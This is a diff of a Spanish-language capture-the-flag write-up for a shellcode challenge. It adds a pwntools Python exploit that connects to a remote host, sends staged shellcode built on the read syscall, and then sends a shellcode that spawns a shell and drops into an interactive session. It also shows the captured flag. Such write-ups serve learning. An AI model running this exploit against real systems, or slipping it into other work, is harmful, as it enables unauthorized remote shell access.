@@ -28,10 +28,11 @@ call    memcpy
 
 Es en la instrucción "call memcpy" nos va a copiar "algo" hardcodeado a otra posición de memoria. Este "algo" es un código que se ejecuta previamente a nuestro shellcode que vamos a pasarle. 
 
+```
 Breakpoint 3 at 0x555555554d89
- 
-Así llama a la función memcpy:
+```
 
+Así llama a la función memcpy:
 
 ```
 Guessed arguments:
@@ -302,7 +303,7 @@ Y por fin, la ansiada flag:
 hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}
 ```
 
-Otra solución a estudiar para ver que hace exactamente para hacer la llamada al syscall:
+Otra solución a estudiar pero esta vez usando la llamada sys_read de syscall:
 
 ```asm
 ;BITS64
@@ -324,3 +325,35 @@ syscall
 jmp loop
 ```
 
+Así es como quedaría el python de esta nueva solución:
+
+```python
+#!/usr/bin/env python
+# coding=utf8
+
+from pwn import remote, shellcraft, asm, context
+from time import sleep
+
+context.arch = 'amd64'
+p = remote('52.69.40.204', 8361)
+
+shellcode = '''
+add r9w, 0x8285
+mov dl, 100
+lea rsi, [rip - 0x010503]
+
+loop:
+add rsi, r9
+xor eax, eax
+syscall
+jmp loop
+'''
+
+print shellcode
+payload = asm(shellcode)
+print payload
+p.send(payload)
+sleep(0.5)
+p.sendline(asm(shellcraft.amd64.linux.sh()))
+p.interactive()
+```
